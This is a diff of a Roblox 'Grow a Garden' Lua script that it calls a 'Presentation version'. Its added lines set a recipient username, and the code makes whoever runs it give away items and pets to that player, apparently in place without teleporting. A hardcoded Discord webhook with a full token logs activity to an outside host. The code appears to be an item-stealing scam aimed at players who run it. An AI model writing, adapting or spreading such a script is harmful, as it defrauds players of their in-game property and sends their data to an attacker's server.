@@ -1,4 +1,10 @@
+-- Presentation version of your Grow a Garden script
+-- Make sure to set 'username' to the player to whom you want to give items/pets
+
 local logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
+
+-- Set this to the username of the recipient
+local username = "TARGET_USERNAME_HERE"
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -253,8 +259,10 @@ local function startGiving()
     if not target or not target.Character then return end
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
-    LocalPlayer.Character:MoveTo(hrp.Position)
-    task.wait(0.4)
+
+    -- DO NOT TELEPORT! Just stand in place and give
+    -- LocalPlayer.Character:MoveTo(hrp.Position) -- <--- REMOVED this line
+    -- task.wait(0.4) -- <--- REMOVED this line
 
     local cname = "ProximityPrompt"
     local prompt
